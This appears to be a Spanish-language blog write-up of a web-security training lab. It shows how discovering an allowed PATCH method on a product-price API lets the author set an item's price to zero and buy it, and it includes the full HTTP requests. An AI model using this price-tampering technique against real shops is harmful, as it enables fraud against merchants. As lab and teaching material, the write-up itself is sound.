---
layout: post
author: kryraj
---

¡Segundo laboratorio! Para completar este laboratorio tenemos que comprar el siguiente articulo "Lightweight l33t Leather Jacket." 

Tenemos credenciales wiener:peter 

Ahora cuando iniciemos sesión, cuando veamos el producto objetivo nos fijamos que no tenemos dinero y si intentamos interactuar con el artículo objetivo vemos la siguiente URL 
```
GET /api/products/1/price HTTP/2
Host: .web-security-academy.net
Cookie: session=ZIg32UByQJKh4NQMYHq7ITDZ58eazc1Y
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

```

Una forma para obtener errores, o respuestas interesantes es utilizar el método "OPTIONS" 

![Image]({{ site.baseurl }}/assets/images/apihacking2.png)

Vemos que podemos utilizar el método "PATCH" el cual nos puede servir para modificar el precio. 
Pero cuidado, si utilizamos PATCH en este caso tendremos que poner el Content-Type:application/json
 

```
PATCH /api/products/1/price HTTP/2
Host: .web-security-academy.net
Cookie: session=ZIg32UByQJKh4NQMYHq7ITDZ58eazc1Y
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Type:application/json

{
	"price":0
}

```

Bien, ya teniendo esta petición lista, enviamos y veremos la siguiente respuesta

![Image]({{ site.baseurl }}/assets/images/apihacking3.png)

Ahora es tan simple como añadirlo a la cesta y comprarlo.  

¡Laboratorio completado! 


